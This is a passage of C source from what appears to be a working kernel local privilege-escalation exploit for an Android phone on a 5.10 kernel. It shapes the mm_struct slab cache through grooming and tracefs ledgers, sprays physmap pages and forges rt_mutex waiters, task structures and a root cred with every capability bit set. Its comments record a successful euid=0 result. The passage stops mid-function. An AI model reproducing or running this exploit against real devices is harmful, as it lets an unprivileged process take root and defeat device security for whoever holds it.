        if ((v & ~(uintptr_t)0x3fff) == slab_lo) {
          same_page_any = 1;
        }
        if (v >= slab_lo && v < slab_hi) {
          in_slab++;
        }
        if (shown < 6) {
          snprintf(sample[shown], sizeof(sample[0]), "%016llx",
                   (unsigned long long)v);
          shown++;
        }
      }
    }
    if (!nl) {
      break;
    }
    p = nl + 1;
  }
  pr_success("ledger %s: mmdrops=%d in_leak_page=%d page_any=%d [%s] samples=%s %s %s %s %s %s\n",
             tag, total, in_slab, same_page_any, alive, sample[0], sample[1],
             sample[2], sample[3], sample[4], sample[5]);
  free(buf);
}

static void ledger_dump_frees(const char *tag, uintptr_t leaked) {
  ledger_report_switches(tag);
  char *buf = trace_read_all();
  if (!buf) {
    return;
  }
  int total = 0;
  int mmlike = 0;
  int leak_page_seen = 0;
  uintptr_t leak_page = leaked & ~(uintptr_t)(0x4000 - 1);
  char sample[6][32] = {{0}};
  int shown = 0;
  char *p = buf;
  while (*p) {
    char *nl = strchr(p, '\n');
    if (nl) {
      *nl = 0;
    }
    if (strstr(p, "kmfa:")) {
      char *a = strstr(p, "ptr=0x");
      if (a) {
        uintptr_t v = (uintptr_t)strtoull(a + 6, NULL, 16);
        total++;
        /* mm_struct objects sit at slab_base + k*0x3c0 inside a 16K page */
        if (v >= P0_PAGE_OFFSET && (v & 0x3fff) < 0x3c0 * 17 &&
            ((v & 0x3fff) % 0x3c0) == 0) {
          mmlike++;
          if ((v & ~(uintptr_t)0x3fff) == leak_page) {
            leak_page_seen = 1;
          }
          if (shown < 6) {
            snprintf(sample[shown], sizeof(sample[0]), "%016llx",
                     (unsigned long long)v);
            shown++;
          }
        }
      }
    }
    if (!nl) {
      break;
    }
    p = nl + 1;
  }
  pr_success("ledger %s: total=%d mm_like=%d leak_page_freed=%d samples=%s %s %s %s %s %s\n",
             tag, total, mmlike, leak_page_seen, sample[0], sample[1],
             sample[2], sample[3], sample[4], sample[5]);
  free(buf);
}

static void ledger_dump_allocs(const char *tag, uintptr_t leaked) {
  char *buf = trace_read_all();
  if (!buf) {
    return;
  }
  int count = 0;
  int hit = 0;
  char first[4][32] = {{0}};
  int shown = 0;
  char *p = buf;
  while (*p) {
    char *nl = strchr(p, '\n');
    if (nl) {
      *nl = 0;
    }
    if (strstr(p, "kcp:")) {
      char *a = strstr(p, "mm=0x");
      if (a) {
        uintptr_t v = (uintptr_t)strtoull(a + 6, NULL, 16);
        if (v == leaked) {
          hit = 1;
        }
        if (shown < 4) {
          snprintf(first[shown], sizeof(first[0]), "%016llx",
                   (unsigned long long)v);
          shown++;
        }
        count++;
      }
    }
    if (!nl) {
      break;
    }
    p = nl + 1;
  }
  pr_success("ledger %s: %d mm allocs first=%s %s %s %s leaked_in_list=%d\n",
             tag, count, first[0], first[1], first[2], first[3], hit);
  free(buf);
}
#else
static void mm_slab_ledger_arm(uintptr_t leaked) { (void)leaked; }
static void mm_slab_ledger_dump(const char *tag, uintptr_t leaked) { (void)tag; (void)leaked; }
static void ledger_track_allocs_arm(void) {}
static void ledger_dump_mmdrops(const char *tag, uintptr_t leaked) {
  (void)tag;
  (void)leaked;
}
static void ledger_dump_frees(const char *tag, uintptr_t leaked) {
  (void)tag;
  (void)leaked;
}
/* §58 grooming instrumentation stubs: the definitions above are QEMU-only
   (tracefs), but the call sites are shared with the device build. */
static void ledger_probe_enable(const char *name, int on) { (void)name; (void)on; }
static void ledger_free_window_begin(void) {}
static void ledger_dump_allocs(const char *tag, uintptr_t leaked) {
  (void)tag;
  (void)leaked;
}
#endif

/* Did kmem:mm_page_free report this PFN yet?  Reading /sys/kernel/tracing/trace
   consumes it, which is fine - presence is all we need.  The trace prints the
   pfn as %pfn (hex with 0x) and/or decimal, so check both. */
#ifndef ZF9_DEVICE
static char *trace_read_all(void);
static int trace_pfn_seen(unsigned long pfn) {
  char hex[32];
  char dec[32];
  snprintf(hex, sizeof(hex), "0x%lx", pfn);
  snprintf(dec, sizeof(dec), "pfn=%lu", pfn);
  /* The formatted trace file is larger than the ring buffer, so a short read
     only ever sees the OLDEST events - read the whole thing. */
  char *buf = trace_read_all();
  if (!buf) {
    return 0;
  }
  int seen = (strstr(buf, hex) || strstr(buf, dec)) ? 1 : 0;
  free(buf);
  return seen;
}
#endif

/* §89: gate the reclaim spray on the leaked slab actually reaching the buddy.
   mmdrop's lazy-TLB path frees via call_rcu, so kmem_cache_free (and hence the
   discard) can arrive tens of ms to seconds AFTER waitpid() returns - long after
   the spray has taken other pages.  Wait (and report the latency) before
   spraying; the device has no tracefs, so it uses a fixed delay instead. */
#ifndef ZF9_DEVICE
static void gate_spray_on_page_free(uintptr_t leaked) {
  unsigned long pfn =
      (unsigned long)(((leaked - P0_PAGE_OFFSET) + P0_PHYS_OFFSET) >> 12);
  int seen_ms = -1;
  for (int i = 0; i < 60; i++) {
    if (trace_pfn_seen(pfn)) {
      seen_ms = i * 100;
      break;
    }
    usleep(100000);
  }
  pr_success("spray gate: leaked pfn=0x%lx %s%s\n", pfn,
             seen_ms >= 0 ? "reached buddy after " : "NEVER reached buddy",
             seen_ms >= 0 ? "" : "");
  if (seen_ms >= 0) {
    pr_success("spray gate: delay %d ms\n", seen_ms);
  } else {
    pr_warning("spray gate: proceeding without the PFN ever appearing\n");
  }
}
#else
static void gate_spray_on_page_free(uintptr_t leaked) { (void)leaked; }
#endif

/* §89: how many mm_struct objects are still alive after we release everything?
   Baseline (before we allocate) minus after-release tells us how many of OUR
   objects are pinned - a cheap per-slab-ownership proxy without kprobes. */
#ifndef ZF9_DEVICE
static long read_sysfs_long(const char *path);
static void report_slab_usage(const char *tag) {
  long objs = read_sysfs_long("/sys/kernel/slab/mm_struct/objects");
  long slabs = read_sysfs_long("/sys/kernel/slab/mm_struct/slabs");
  long part = read_sysfs_long("/sys/kernel/slab/mm_struct/objects_partial");
  pr_success("slab usage %s: objects=%ld slabs=%ld objects_partial=%ld\n",
             tag, objs, slabs, part);
}

static void dump_self_fds(const char *tag) {
  DIR *d = opendir("/proc/self/fd");
  if (!d) {
    return;
  }
  struct dirent *e;
  char path[64];
  char tgt[256];
  int suspicious = 0;
  while ((e = readdir(d)) != NULL) {
    if (e->d_name[0] < '0' || e->d_name[0] > '9') {
      continue;
    }
    snprintf(path, sizeof(path), "/proc/self/fd/%s", e->d_name);
    ssize_t n = readlink(path, tgt, sizeof(tgt) - 1);
    if (n <= 0) {
      continue;
    }
    tgt[n] = 0;
    if (strstr(tgt, "/mem") || strstr(tgt, "memfd") ||
        strstr(tgt, "/proc/")) {
      pr_warning("fd %s -> %s\n", e->d_name, tgt);
      suspicious++;
    }
  }
  closedir(d);
  pr_success("fd scan %s: suspicious=%d\n", tag, suspicious);
}
#else
static void report_slab_usage(const char *tag) { (void)tag; }
static void dump_self_fds(const char *tag) { (void)tag; }
#endif

/* §58 drain gate: when every existing mm_struct slab is completely full
   (objects in use == objs_per_slab * slabs) the next allocation must open a
   fresh slab, which we can then own entirely.  QEMU/root only (the device
   drains blind and relies on the probe oracle + re-groom). */
#ifndef ZF9_DEVICE
static long read_sysfs_long(const char *path) {
  char buf[64];
  int fd = open(path, O_RDONLY);
  if (fd < 0) {
    return -1;
  }
  ssize_t n = read(fd, buf, sizeof(buf) - 1);
  close(fd);
  if (n <= 0) {
    return -1;
  }
  buf[n] = 0;
  return strtol(buf, NULL, 10);
}

static void wait_for_mm_slabs_full(void) {
  for (int i = 0; i < 400; i++) {
    long objs = read_sysfs_long("/sys/kernel/slab/mm_struct/objects");
    long slabs = read_sysfs_long("/sys/kernel/slab/mm_struct/slabs");
    if (objs > 0 && slabs > 0 &&
        objs == (long)mm_objs_per_slab * slabs) {
      pr_success("drain gate: all mm slabs full objects=%ld slabs=%ld\n",
                 objs, slabs);
      return;
    }
    if ((i % 50) == 0) {
      pr_info("drain gate: objects=%ld slabs=%ld target=%zu\n",
              objs, slabs, mm_objs_per_slab);
    }
    usleep(5000);
  }
  pr_warning("drain gate timed out; continuing anyway\n");
}
#else
static void wait_for_mm_slabs_full(void) {}
#endif

static void put_direct_waiter(
    unsigned char *p, uintptr_t parent, uintptr_t right,
    uintptr_t left, uint64_t waiter_task) {
  put64(p, W0_OFF + WAITER_TREE_ENTRY_OFF + 0x00, 1);
  put64(p, W0_OFF + WAITER_TREE_ENTRY_OFF + 0x08, 0);
  put64(p, W0_OFF + WAITER_TREE_ENTRY_OFF + 0x10, 0);
  put64(p, W0_OFF + WAITER_PI_TREE_ENTRY_OFF + 0x00, parent);
  put64(p, W0_OFF + WAITER_PI_TREE_ENTRY_OFF + 0x08, right);
  put64(p, W0_OFF + WAITER_PI_TREE_ENTRY_OFF + 0x10, left);
  /* 5.10 flat rt_mutex_waiter: no pi_tree.prio/deadline, no wake_state/ww_ctx.
     Single prio(0x40)/deadline(0x48) after task/lock. */
  put64(p, W0_OFF + WAITER_TASK_OFF, waiter_task);
  put64(p, W0_OFF + WAITER_LOCK_OFF, fake_lock);
  put32(p, W0_OFF + WAITER_PRIO_OFF, FAKE_WAITER_PRIO);
  put64(p, W0_OFF + WAITER_DEADLINE_OFF, 0);
}

int prepare_skb_payload(uintptr_t base, int payload_mode) {
  if (payload_mode != PAGE_PAYLOAD_SLIDE &&
      payload_mode != PAGE_PAYLOAD_FOPS) {
    return 0;
  }
  /* v16b: back to zero-fill - a 0x01 pattern makes UBSAN bounds checks inside
     the PI walk (e.g. ttwu_runnable) trap with brk #0x5512.  The fake_task's
     own usage is set explicitly, and its prio now matches the waiter's so the
     chain never reprioritises/wakes it. */
  memset(skb_buf, 0, SKB_SEND_SIZE);

  uintptr_t payload_base = base + (uintptr_t)g_skb_delta;
  fake_lock = payload_base + LOCK_OFF;
  fake_w0 = payload_base + W0_OFF;
  fake_task = payload_base + FAKE_TASK_OFF;
  fake_cred = payload_base + FAKE_CRED_OFF;

  uintptr_t parent;
  uintptr_t right;
  uintptr_t left;
  uint64_t waiter_task;
  uint64_t task_group;
  uint64_t pi_top_task;

  if (payload_mode == PAGE_PAYLOAD_SLIDE) {
    /* §124.46: slide anchor follows pr_slide_ns (persist.c, `slidens` token).
       Default = loggers (legacy); nsproxy = the boot-invariant anchor.  BOTH
       the chain (parent) and the staging must use the same anchor, or the
       walk reads one anchor's field. */
    parent = pr_slide_ns == 2 ? SLIDE_TASK_PREV_PTR :
             pr_slide_ns ? SLIDE_TASK_NSPROXY_PTR : SLIDE_LOGGERS_0_1;
    right = 0;
    left = SLIDE_RANDOM_BOOT_ID_DATA;
    waiter_task = SLIDE_INIT_TASK;
    task_group = SLIDE_ROOT_TASK_GROUP;
    pi_top_task = SLIDE_INIT_TASK;
  } else {
    parent = pselect_custom_value;
    right = 0;
    left = pselect_custom_target;
    if (pselect_custom_shape == 1) {
      if (pselect_custom_target < 8) {
        return 0;
      }
      parent = pselect_custom_target - 8;
      right = pselect_custom_value;
      left = 0;
    }
    /* v10: align the walk with the stable SLIDE mode - use the REAL init_task
       rather than the fabricated task, so rt_mutex_setprio() manipulates a
       real task_struct instead of corrupting the scheduler. */
    waiter_task = SLIDE_INIT_TASK;
    task_group = SLIDE_ROOT_TASK_GROUP;
    pi_top_task = SLIDE_INIT_TASK;
  }

  for (size_t chunk = 0; chunk < SKB_SEND_SIZE; chunk += ORDER3_SIZE) {
    unsigned char *p = skb_buf + chunk;

    /* debug magic: lets the QEMU harness find where the sprayed payload
       actually landed (see ZENFONE9_STATUS.md §38). */
    put64(p, 0x00, 0x4d41474943000001ULL);
    put64(p, 0x1000, 0x4d41474943000001ULL);
    put64(p, 0x2000, 0x4d41474943000001ULL);
    put64(p, 0x3000, 0x4d41474943000001ULL);

    put32(p, LOCK_OFF + 0x00, 0);
    /* v8 fail-soft: keep the walk graph self-contained inside the page.
       lock->waiters -> in-page fake_w0 ; lock->owner -> in-page fake_task. */
    put64(p, LOCK_OFF + 0x08, fake_w0);
    put64(p, LOCK_OFF + 0x10, fake_w0);
    /* v17b: revert to the in-page owner.  Making the owner a real task just
       moves the fault into init_task's pi_waiters walk; the in-page fake
       owner is the combination that actually completed (euid=0).  v11 note:
       in the direct-write (non-SLIDE) mode leave owner=0 so the chain bails. */
    put64(p, LOCK_OFF + 0x18,
          /* §124.114 Q-verify version B: FOPS owner 0 -> fake_task|1.
             owner=0 kills via rt_mutex_owner()->NULL->pi_lock deref in the
             ADJUST path (PERF15 post-mortem, all-in-page still died).
             SLIDE shape already uses fake_task|1 and lives longer. */
          (fake_task | 1));

    put_direct_waiter(p, parent, right, left, waiter_task);

    put32(p, FAKE_TASK_OFF + FAKE_TASK_USAGE_OFF, 0x100);
    put32(p, FAKE_TASK_OFF + FAKE_TASK_PRIO_OFF, FAKE_TASK_PRIO);
    put32(p, FAKE_TASK_OFF + FAKE_TASK_NORMAL_PRIO_OFF, FAKE_TASK_PRIO);
    put32(p, FAKE_TASK_OFF + FAKE_TASK_UCLAMP_REQ_OFF,
          FAKE_UCLAMP_MIN_ACTIVE);
    put32(p, FAKE_TASK_OFF + FAKE_TASK_UCLAMP_REQ_OFF + 4,
          FAKE_UCLAMP_MAX_ACTIVE);
    put32(p, FAKE_TASK_OFF + FAKE_TASK_UCLAMP_OFF,
          FAKE_UCLAMP_MIN_ACTIVE);
    put32(p, FAKE_TASK_OFF + FAKE_TASK_UCLAMP_OFF + 4,
          FAKE_UCLAMP_MAX_ACTIVE);
    put32(p, FAKE_TASK_OFF + FAKE_TASK_PI_LOCK_OFF, 0);
    /* v8 fail-soft: fake_task has no PI waiters (empty tree) so any
       rt_mutex_dequeue_pi/rt_mutex_setprio on it is a no-op. */
    put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF, 0);
    put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 8, 0);
    put64(p, FAKE_TASK_OFF + FAKE_TASK_TASK_GROUP_OFF, task_group);
    put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_TOP_TASK_OFF, pi_top_task);
    put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_BLOCKED_ON_OFF, 0);

    /* v14: a private root cred, so the write primitive's collateral lands in
       OUR page instead of corrupting the real init_cred. */
    put32(p, FAKE_CRED_OFF + CRED_USAGE_OFF, 0x100000);
    for (size_t co = CRED_UID_OFF; co <= CRED_FSGID_OFF; co += 4) {
      put32(p, FAKE_CRED_OFF + co, 0);
    }
    put32(p, FAKE_CRED_OFF + CRED_SECUREBITS_OFF, 0);
    for (size_t co = CRED_CAP_INH_OFF; co <= CRED_CAP_AMB_OFF; co += 8) {
      put64(p, FAKE_CRED_OFF + co, ~0ULL);
    }
    put64(p, FAKE_CRED_OFF + CRED_SECURITY_OFF, fake_cred_security);
    put64(p, FAKE_CRED_OFF + CRED_USER_NS_OFF, fake_cred_user_ns);
  }

  /* v13 self-check: read back what actually landed in the buffer, so a
     builder/offset bug is visible without a QEMU memory dump. */
  {
    const unsigned char *p = skb_buf;
    printf("PLCHK buf=%p lock+8=%016llx(exp %016llx) w0+0=%016llx "
           "w0.task=%016llx(exp %016llx) w0.lock=%016llx(exp %016llx) "
           "usage=%08x magic0=%016llx magic1=%016llx\n",
           (const void *)p,
           (unsigned long long)get64(p, LOCK_OFF + 0x08),
           (unsigned long long)fake_w0,
           (unsigned long long)get64(p, W0_OFF + 0x00),
           (unsigned long long)waiter_task,
           (unsigned long long)get64(p, W0_OFF + WAITER_TASK_OFF),
           (unsigned long long)get64(p, W0_OFF + WAITER_LOCK_OFF),
           (unsigned long long)fake_lock,
           get32(p, FAKE_TASK_OFF + FAKE_TASK_USAGE_OFF),
           (unsigned long long)get64(p, 0x00),
           (unsigned long long)get64(p, 0x1000));
    fflush(stdout);
  }
  return 1;
}

/* v14: patch a field inside the already-built payload (all chunks), used to
   fill the private cred's security/user_ns after they are read from the
   real init_cred via the arbitrary-read primitive. */
void payload_patch64(size_t off, uint64_t value) {
  if (!skb_buf) {
    return;
  }
  for (size_t chunk = 0; chunk + off + 8 <= SKB_SEND_SIZE;
       chunk += ORDER3_SIZE) {
    put64(skb_buf + chunk, off, value);
  }
}

uint32_t payload_read32(size_t off) {
  if (!skb_buf) {
    return 0;
  }
  return get32(skb_buf, off);
}

/* The direct-map alias of the payload page ( = payload_base = alias ).  For the
   QEMU/DMAP route this is a KNOWN, KASLR-independent address whose contents we
   fully control - a perfect known-plaintext target for the delta probe. */
/* §113.13: rotate one pristine zero slot per attempt (empty_zero_page+0x900,
   0x100 apart).  Each round's walk poisons the slot it used, so every attempt
   gets fresh zeros. */
uintptr_t zerolock_slot(int i) {
  return P0_DATA_ALIAS_CONST(
      ZERO_LOCK_IMAGE + (uintptr_t)((i % ZERO_LOCK_SLOTS) * ZERO_LOCK_STRIDE));
}

uintptr_t dmap_alias(void) {
  if (g_zero_lock) {
    /* §113: the probe's known-plaintext value is the always-zero page itself -
       boot_id must then read back 16 zero bytes. */
    return ZERO_LOCK_ALIAS;
  }
  if (dmap_page) {
    return dmap_base + (uintptr_t)g_skb_delta;
  }
  /* §58 grooming route: the payload lives in the reclaimed kmalloc slab; its
     base (offset 0 holds the magic) is a known kernel address. */
  if (skb_buf && fake_lock) {
    return fake_lock - LOCK_OFF;
  }
  return 0;
}

/* Copy the live page contents out (MAP_SHARED: the parent's view includes
   whatever the kernel's PI walk wrote during the last primitive). */
size_t payload_copy_out(unsigned char *dst, size_t cap) {
  if (!skb_buf) {
    return 0;
  }
  size_t n = cap < (size_t)SKB_SEND_SIZE ? cap : (size_t)SKB_SEND_SIZE;
  memcpy(dst, skb_buf, n);
  return n;
}

/* §82 unified payload shape: make the structures round-invariant (fake_w0
   self-rooted as RB_EMPTY_NODE, lock->owner = fake_task|1 since §124.114).
   Every round-varying value (tree/pi_tree parent/right/left, waiter prio) is
   supplied by the overlay, so one sprayed payload can serve slide AND direct
   rounds.  Used by BOTH the DMAP route and the §58 grooming route. */
void payload_neutralize(void) {
  if (!skb_buf) {
    return;
  }
  for (size_t chunk = 0; chunk < SKB_SEND_SIZE; chunk += ORDER3_SIZE) {
    unsigned char *p = skb_buf + chunk;
    put64(p, W0_OFF + 0x00, fake_w0);
    put64(p, W0_OFF + 0x08, 0);
    put64(p, W0_OFF + 0x10, 0);
    put64(p, W0_OFF + 0x18, fake_w0);
    put64(p, W0_OFF + 0x20, 0);
    put64(p, W0_OFF + 0x28, 0);
    put64(p, LOCK_OFF + 0x18, (fake_task | 1));
  }
}

#ifndef ZF9_DEVICE
static uint64_t kcore_find_magic(uint64_t start, uint64_t end);
#endif

/* v9.1: SLUB keeps empty slabs on the partial list (min_partial), so the mm
   cache's freed slabs are not handed back to the buddy until the shrinkers
   run.  Trigger reclaim (large anonymous alloc) and, when permitted, drop
   caches - otherwise the leaked slab can never be reclaimed by the SKB. */
static void force_slab_release(void) {
  const char *drop = "/proc/sys/vm/drop_caches";
  const char *shr = "/sys/kernel/slab/mm_struct/shrink";
  int fd = open(shr, O_WRONLY);
  if (fd >= 0) {
    ssize_t w = write(fd, "2", 1);   /* discard empty slabs of the mm cache */
    (void)w;
    close(fd);
  }
  fd = open(drop, O_WRONLY);
  if (fd >= 0) {
    ssize_t w = write(fd, "3", 1);
    (void)w;
    close(fd);
  }
  size_t sz = 1UL << 30;
  void *p = mmap(NULL, sz, PROT_READ | PROT_WRITE,
                 MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
  if (p != MAP_FAILED) {
    memset(p, 0, sz);
    munmap(p, sz);
  }
  fd = open(shr, O_WRONLY);
  if (fd >= 0) {
    ssize_t w = write(fd, "2", 1);
    (void)w;
    close(fd);
  }
  fd = open(drop, O_WRONLY);
  if (fd >= 0) {
    ssize_t w = write(fd, "3", 1);
    (void)w;
    close(fd);
  }
}

#ifndef ZF9_DEVICE
/* v19: build the shared DMAP payload page once.  MAP_SHARED so forked
   primitive children share the SAME physical pages (a private mapping would
   COW on the child's prepare_skb_payload() write and de-contiguise the run).
   The kernel reaches the payload through ONE direct-map alias (alias + OFF),
   so the backing pages MUST be physically contiguous (a plain anon mapping
   scatters and reads as zeros past page 0 - the old "fake_lock is zero" bug).
   THP + a pagemap contiguity check, then mlock so compaction / THP split
   cannot migrate the page away from the alias. */
static int dmap_page_setup(void) {
  const size_t PG = 0x1000;
  const size_t HP = 2 * 1024 * 1024;
  const size_t need = SKB_SEND_SIZE + PG;
  const size_t npages = (need + PG - 1) / PG;

  /* mlock needs RLIMIT_MEMLOCK; raise it to the hard cap (best effort - on a
     stock device the hard cap may be small, in which case mlock fails and we
     carry on without the pin). */
  struct rlimit rl;
  if (getrlimit(RLIMIT_MEMLOCK, &rl) == 0 && rl.rlim_cur < rl.rlim_max) {
    rl.rlim_cur = rl.rlim_max;
    (void)setrlimit(RLIMIT_MEMLOCK, &rl);
  }

  for (int attempt = 0; attempt < 8; attempt++) {
    unsigned char *raw = mmap(NULL, HP * 2, PROT_READ | PROT_WRITE,
                              MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    if (raw == MAP_FAILED) {
      return 0;
    }
    /* THP only kicks in for a 2MB-aligned VMA; trim the mapping to one. */
    uintptr_t aligned = ((uintptr_t)raw + HP - 1) & ~(uintptr_t)(HP - 1);
    if (aligned != (uintptr_t)raw) {
      munmap(raw, aligned - (uintptr_t)raw);
    }
    unsigned char *cand = (unsigned char *)aligned;
    size_t keep = HP;
    if (aligned + HP > (uintptr_t)raw + HP * 2) {
      keep = (uintptr_t)raw + HP * 2 - aligned;
    }
    munmap(cand + keep, ((uintptr_t)raw + HP * 2) - (aligned + keep));
    madvise(cand, keep, MADV_HUGEPAGE);
    memset(cand, 0, need);
    if (mlock(cand, keep) != 0) {
      pr_warning("dmap mlock failed errno=%d (continuing unpinned)\n", errno);
    }

    int fd = open("/proc/self/pagemap", O_RDONLY);
    if (fd < 0) {
      munmap(cand, keep);
      return 0;
    }
    uint64_t pfn0 = 0;
    int contiguous = 1;
    for (size_t i = 0; i < npages; i++) {
      uint64_t pte = 0;
      off_t off = (off_t)((((uintptr_t)cand + i * PG) / PG) * 8);
      if (pread(fd, &pte, 8, off) != 8 || !(pte & (1ULL << 63))) {
        contiguous = 0;
        break;
      }
      uint64_t pfn = pte & ((1ULL << 55) - 1);
      if (!pfn) {
        contiguous = 0;
        break;
      }
      if (i == 0) {
        pfn0 = pfn;
      } else if (pfn != pfn0 + i) {
        contiguous = 0;
        break;
      }
    }
    close(fd);
    if (contiguous) {
      /* direct map is PO | (phys - PHYS_OFFSET), NOT PO | phys */
      uintptr_t alias = P0_PAGE_OFFSET |
                        ((uintptr_t)(pfn0 << 12) - P0_PHYS_OFFSET);
      /* prepare_skb_payload(base) uses payload_base = base + SKB_DATA_DELTA,
         so the callers must pass back base, NOT the alias. */
      dmap_page = cand;
      dmap_keep = keep;
      dmap_base = alias - (uintptr_t)g_skb_delta;
      printf("DMAP page ready pfn=%llx npages=%zu alias=%016zx base=%016zx\n",
             (unsigned long long)pfn0, npages, (size_t)alias, (size_t)dmap_base);
      fflush(stdout);
      return 1;
    }
    printf("DMAP retry: pages not physically contiguous (attempt %d)\n",
           attempt + 1);
    fflush(stdout);
    munmap(cand, keep);
  }
  return 0;
}
#endif

/* §102 physmap route (replaces the whole grooming business): spray an anonymous
   mapping whose every 4 KB page holds an identical copy of the payload
   template, then use the direct-map alias of a *chosen physical address* as the
   fake lock.  No pagemap (device), no slab reclaim, no leak value needed - the
   only assumption is that our spray covers the chosen physical page. */
int g_physmap = 0;
/* §113: zerolock mode - no payload page at all; the overlay's lock (word7) is
   the always-zero linker padding page and word6 is a second zero page. */
int g_zero_lock = 0;
uintptr_t g_pmap_phys_wanted = 0;   /* 0 = derive from pagemap (QEMU only) */
int g_own_probe = 0;                /* §109 delta-free self-write probe */
#ifdef ZF9_DEVICE
/* Device: no pagemap, so the candidate pool spans BOTH RAM banks (§36 block
   map, persist.c pr_sweep_phys_pair): [2GB,4GB) and [32GB,38GB).  A 1.5GB
   spray puts ~1GB of our pages inside that pool, and the sweep walks the grid
   (PR_SWEEP_CANDS entries, high bank first) until SWEEP HIT.  See §124.35-36.
   Measured headroom: `spraymem 3072` survived untouched on this device. */
#define PMAP_SIZE (1536UL << 20)
#else
#define PMAP_SIZE (512UL << 20)
#endif

static void *pmap_buf;
static size_t pmap_len;
static uintptr_t pmap_alias;

static void physmap_layout_select(void) {
  g_lock_off = PM_LOCK_OFF;
  g_w0_off = PM_W0_OFF;
  g_task_off = PM_TASK_OFF;
  g_cred_off = PM_CRED;
  g_skb_delta = 0; /* alias + offset is the identity inside the page */
}

#ifndef ZF9_DEVICE
static uintptr_t pagemap_pfn_of(void *p) {
  int fd = open("/proc/self/pagemap", O_RDONLY);
  if (fd < 0) {
    return 0;
  }
  uint64_t pte = 0;
  off_t off = (off_t)((((uintptr_t)p / PAGE_SIZE)) * 8);
  ssize_t n = pread(fd, &pte, 8, off);
  close(fd);
  if (n != 8 || !(pte & (1ULL << 63))) {
    return 0;
  }
  return (uintptr_t)(pte & ((1ULL << 55) - 1));
}
#endif

static int physmap_setup(void) {
  if (!pmap_buf) {
    void *b = mmap(NULL, PMAP_SIZE, PROT_READ | PROT_WRITE,
                   MAP_PRIVATE | MAP_ANONYMOUS | MAP_NORESERVE, -1, 0);
    if (b == MAP_FAILED) {
      pr_warning("physmap: mmap %zu failed\n", (size_t)PMAP_SIZE);
      return 0;
    }
    for (size_t o = 0; o < PMAP_SIZE; o += PAGE_SIZE) {
      ((volatile char *)b)[o] = 0;
    }
    /* §124.26 ledger discriminator: VmRSS right after the fault loop tells the
       two causes of an all-miss sweep apart - "our pages were reclaimed"
       (VmRSS ~ PMAP_SIZE => holding engineering is the fix) vs "the allocation
       never landed" (VmRSS << PMAP_SIZE => lmkd/memory pressure, a different
       fix).  Without this line both look identical in the ledger. */
    {
      FILE *sf = fopen("/proc/self/status", "re");
      if (sf) {
        char line[160];
        while (fgets(line, sizeof(line), sf)) {
          if (!strncmp(line, "VmRSS:", 6) || !strncmp(line, "RssAnon:", 8)) {
            size_t n = strlen(line);
            if (n && line[n - 1] == '\n') {
              line[n - 1] = 0;
            }
            pr_success("spray %s (requested %zu MB)\n", line,
                       (size_t)(PMAP_SIZE >> 20));
          }
        }
        fclose(sf);
      }
    }
    pmap_buf = b;
    pmap_len = PMAP_SIZE;
  }
  uintptr_t phys = g_pmap_phys_wanted;
  if (!phys) {
#ifndef ZF9_DEVICE
    uintptr_t pfn = pagemap_pfn_of(pmap_buf);
    if (!pfn) {
      pr_warning("physmap: pagemap gave no pfn; pass phys=0x...\n");
      return 0;
    }
    phys = pfn << 12;
#else
    pr_warning("physmap: no candidate physical address (phys=0x...)\n");
    return 0;
#endif
  }
  pmap_alias = P0_PAGE_OFFSET | (phys - P0_PHYS_OFFSET);
  pr_success("PHYSMAP candidate phys=%016zx alias=%016zx pages=%zu\n",
             (size_t)phys, (size_t)pmap_alias, pmap_len >> 12);
  return 1;
}

static void physmap_replicate(void) {
  char *base = (char *)pmap_buf;
  for (size_t o = PAGE_SIZE; o < pmap_len; o += PAGE_SIZE) {
    memcpy(base + o, base, PAGE_SIZE);
  }
}

/* §103 sweep support: point the fake structures at a different candidate
   physical page.  The payload content embeds absolute addresses (alias + off),
   so every candidate needs a rebuild + replicate - the page is ours, so this is
   just userspace work. */
int physmap_retarget_mode(uintptr_t phys, int payload_mode) {
  if (!pmap_buf) {
    return 0;
  }
  physmap_layout_select();
  g_pmap_phys_wanted = phys;
  pmap_alias = P0_PAGE_OFFSET | (phys - P0_PHYS_OFFSET);
  dmap_base = pmap_alias;
  skb_buf = pmap_buf;
  skb_buf_is_mmap = 1;
  if (!prepare_skb_payload(pmap_alias, payload_mode)) {
    return 0;
  }
  /* §124.11 Path A: the fake file_operations table lives in OUR page at
     CFI_PM_FOPS_OFF.  It embeds KASLR-resolved .cfi_jt pointers, so it can only
     be filled once the slide is known; the page is rebuilt on every retarget, so
     the fill is re-applied here (idempotent). */
  if (kaslr_base) {
    cfi_fill_fake_fops((unsigned char *)pmap_buf, CFI_PM_FOPS_OFF);
  }
  physmap_replicate();
  page_base = pmap_alias;   /* persist.c rebuilds the page from this each round */
  return 1;
}

int physmap_retarget(uintptr_t phys) {
  return physmap_retarget_mode(phys, PAGE_PAYLOAD_FOPS);
}

/* §101: the leaked slab must empty while nr_partial is already past
   min_partial(5) - otherwise SLUB *retains* the empty slab on the partial list
   and never revisits it.  So the flood runs FIRST, the leaked group is freed
   last, and a tail flush of >= cpu_partial(13) slabs worth of alloc+free both
   reuses the retained slab off the partial list and discards it as it empties. */
static void slub_tail_flush(size_t slabs) {
  struct mm_ctx flush_ctx;
  init_ctx(&flush_ctx, slabs * mm_objs_per_slab);
  pin_to_core(CORE);
  for (size_t i = 0; i < flush_ctx.mm_cnt; i++) {
    flush_ctx.memfds[i] = clone_memfd();
  }
  report_slab_usage("after-tail-alloc");
  close_ctx_memfds(&flush_ctx);
  report_slab_usage("after-tail-free");
}

/* §99 step 4 observation: order-2 discards go to the freeing CPU's PCP, which
   kmem:mm_page_free does not report.  __free_pages(page, order) does fire there,
   so count order==2 frees and print the raw struct page pointers. */
static void ledger_dump_order2(const char *tag, uintptr_t leaked) {
#ifndef ZF9_DEVICE
  unsigned long pfn =
      (unsigned long)(((leaked - P0_PAGE_OFFSET) + P0_PHYS_OFFSET) >> 12);
  char *buf = trace_read_all();
  if (!buf) {
    return;
  }
  int total = 0;
  int order2 = 0;
  char sample[4][32] = {{0}};
  int shown = 0;
  char *p = buf;
  while (*p) {
    char *nl = strchr(p, '\n');
    if (nl) {
      *nl = 0;
    }
    if (strstr(p, "kfp:")) {
      total++;
      if (strstr(p, "o=0x2")) {
        order2++;
        if (shown < 4) {
          char *a = strstr(p, "p=0x");
          if (a) {
